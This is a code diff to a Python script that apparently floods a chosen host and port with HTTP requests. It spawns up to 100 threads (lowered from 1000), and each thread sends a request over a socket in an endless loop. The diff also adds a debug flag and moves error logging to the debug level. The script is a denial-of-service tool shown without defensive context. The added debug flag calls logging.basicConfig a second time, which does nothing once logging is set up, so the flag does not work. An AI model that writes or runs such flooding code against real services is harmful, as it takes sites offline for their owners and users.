@@ -1,5 +1,5 @@
-import threading
 import logging
+import threading
 import socket
 import time
 import sys
@@ -16,8 +16,11 @@ try:
 except KeyboardInterrupt:
 	sys.exit()
 active_threads = 0
-max_threads = 1000
+max_threads = 100
 logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S", level=logging.INFO)
+
+if "d" in sys.argv or "debug" in sys.argv:
+	logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S", level=logging.DEBUG)
 
 def HTTP(host, port):
 	try:
@@ -29,7 +32,7 @@ def HTTP(host, port):
 		while True:
 			sock.send(http.encode())
 	except Exception as e:
-		logging.info(f"HTTP Error: {e}")
+		logging.debug(f"HTTP Error: {e}")
 		pass
 	finally:
 		active_threads -= 1
@@ -47,7 +50,7 @@ while True:
 			continue
 		threading.Thread(target=HTTP, args=[host, port], daemon=True).start()
 	except Exception as e:
-		logging.info(f"Main Error: {e}")
+		logging.debug(f"Main Error: {e}")
 		pass
 	except KeyboardInterrupt:
 		sys.exit()
